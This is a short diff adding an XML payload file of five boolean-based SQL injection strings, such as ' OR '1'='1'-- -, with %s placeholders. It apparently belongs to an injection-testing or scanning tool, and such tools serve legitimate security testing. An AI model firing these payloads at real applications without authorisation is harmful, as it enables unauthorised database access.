@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<payloads>
+    <technique name="boolean">
+        <payload>%s' AND '1'='1</payload>
+        <payload>%s' AND 1=1-- -</payload>
+        <payload>%s' OR '1'='1'-- -</payload>
+        <payload>%s' AND '1'='1' AND '%'='</payload>
+        <payload>%s' AND (SELECT * FROM (SELECT 1) AS x)='1</payload>
+    </technique>
+</payloads>
